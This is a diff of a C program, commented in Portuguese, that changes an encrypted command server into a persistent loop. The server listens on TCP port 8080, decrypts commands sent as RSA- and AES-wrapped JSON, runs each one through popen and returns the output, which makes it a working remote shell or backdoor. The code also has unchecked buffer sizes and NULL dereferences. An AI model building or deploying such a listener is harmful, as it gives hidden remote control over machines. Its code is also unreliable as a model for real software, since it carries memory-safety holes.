@@ -12,7 +12,7 @@
 #include <openssl/bio.h>
 #include <openssl/buffer.h>
 
-#include <cjson/cJSON.h> // lib cJSON
+#include <cjson/cJSON.h>
 
 #define PORT 8080
 
@@ -34,7 +34,7 @@ unsigned char *base64_decode(const char *input, int *len)
     return buffer;
 }
 
-// Executa o comando recebido e envia de volta a saída
+// Executa o comando e envia a saída de volta
 void execute_command(const char *cmd, int client_sock)
 {
     FILE *fp = popen(cmd, "r");
@@ -59,9 +59,8 @@ int main()
     int sockfd, client_sock;
     struct sockaddr_in server_addr, client_addr;
     socklen_t client_len = sizeof(client_addr);
-    char buffer[4096] = {0};
+    char buffer[4096];
 
-    // Cria socket TCP
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
@@ -70,76 +69,88 @@ int main()
     bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
     listen(sockfd, 1);
 
-    printf("Servidor escutando na porta %d...\n", PORT);
+    printf("🔐 Servidor escutando na porta %d...\n", PORT);
 
     client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
-    printf("Cliente conectado!\n");
+    printf("✅ Cliente conectado!\n");
 
-    // Recebe JSON
-    recv(client_sock, buffer, sizeof(buffer), 0);
-
-    // Parse do JSON recebido
-    cJSON *json = cJSON_Parse(buffer);
-    if (!json)
+    while (1)
     {
-        fprintf(stderr, "Erro ao parsear JSON\n");
-        close(client_sock);
-        return 1;
+        memset(buffer, 0, sizeof(buffer));
+        int recv_len = recv(client_sock, buffer, sizeof(buffer), 0);
+        if (recv_len <= 0)
+        {
+            printf("⚠️ Cliente desconectado ou erro na recepção.\n");
+            break;
+        }
+
+        cJSON *json = cJSON_Parse(buffer);
+        if (!json)
+        {
+            fprintf(stderr, "❌ Erro ao parsear JSON\n");
+            continue;
+        }
+
+        const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
+        const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;
+
+        int key_iv_len;
+        unsigned char *key_iv_enc = base64_decode(keyblob_b64, &key_iv_len);
+
+        FILE *priv_file = fopen("private.pem", "r");
+        if (!priv_file)
+        {
+            fprintf(stderr, "❌ Erro ao abrir private.pem\n");
+            cJSON_Delete(json);
+            free(key_iv_enc);
+            continue;
+        }
+
+        RSA *rsa = PEM_read_RSAPrivateKey(priv_file, NULL, NULL, NULL);
+        fclose(priv_file);
+
+        unsigned char key_iv[48];
+        RSA_private_decrypt(key_iv_len, key_iv_enc, key_iv, rsa, RSA_PKCS1_OAEP_PADDING);
+        RSA_free(rsa);
+        free(key_iv_enc);
+
+        unsigned char aes_key[32], aes_iv[16];
+        memcpy(aes_key, key_iv, 32);
+        memcpy(aes_iv, key_iv + 32, 16);
+
+        int payload_len;
+        unsigned char *payload_enc = base64_decode(payload_b64, &payload_len);
+
+        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+        unsigned char plaintext[1024];
+        int len, plaintext_len;
+
+        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);
+        EVP_DecryptUpdate(ctx, plaintext, &len, payload_enc, payload_len);
+        plaintext_len = len;
+        EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
+        plaintext_len += len;
+        EVP_CIPHER_CTX_free(ctx);
+        free(payload_enc);
+
+        plaintext[plaintext_len] = '\0';
+
+        printf("📥 Comando recebido: %s\n", plaintext);
+
+        if (strcmp((char *)plaintext, "exit") == 0)
+        {
+            printf("🚪 Cliente solicitou saída. Encerrando conexão.\n");
+            cJSON_Delete(json);
+            break;
+        }
+
+        execute_command((char *)plaintext, client_sock);
+
+        cJSON_Delete(json);
     }
 
-    const char *keyblob_b64 = cJSON_GetObjectItem(json, "keyblob")->valuestring;
-    const char *payload_b64 = cJSON_GetObjectItem(json, "payload")->valuestring;
-
-    // Decodifica keyblob (RSA-encrypted AES+IV)
-    int key_iv_len;
-    unsigned char *key_iv_enc = base64_decode(keyblob_b64, &key_iv_len);
-
-    // Carrega chave privada RSA
-    FILE *priv_file = fopen("private.pem", "r");
-    if (!priv_file)
-    {
-        fprintf(stderr, "Erro ao abrir private.pem\n");
-        return 1;
-    }
-
-    RSA *rsa = PEM_read_RSAPrivateKey(priv_file, NULL, NULL, NULL);
-    fclose(priv_file);
-
-    unsigned char key_iv[48];
-    RSA_private_decrypt(key_iv_len, key_iv_enc, key_iv, rsa, RSA_PKCS1_OAEP_PADDING);
-    RSA_free(rsa);
-    free(key_iv_enc);
-
-    unsigned char aes_key[32], aes_iv[16];
-    memcpy(aes_key, key_iv, 32);
-    memcpy(aes_iv, key_iv + 32, 16);
-
-    // Decodifica payload (AES-encrypted comando)
-    int payload_len;
-    unsigned char *payload_enc = base64_decode(payload_b64, &payload_len);
-
-    // Descriptografa o comando
-    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-    unsigned char plaintext[1024];
-    int len, plaintext_len;
-
-    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);
-    EVP_DecryptUpdate(ctx, plaintext, &len, payload_enc, payload_len);
-    plaintext_len = len;
-    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
-    plaintext_len += len;
-    EVP_CIPHER_CTX_free(ctx);
-    free(payload_enc);
-
-    plaintext[plaintext_len] = '\0'; // Garante string finalizada
-
-    // Executa comando e envia resultado de volta
-    execute_command((char *)plaintext, client_sock);
-
-    // Finaliza
     close(client_sock);
     close(sockfd);
-    cJSON_Delete(json);
 
     return 0;
 }
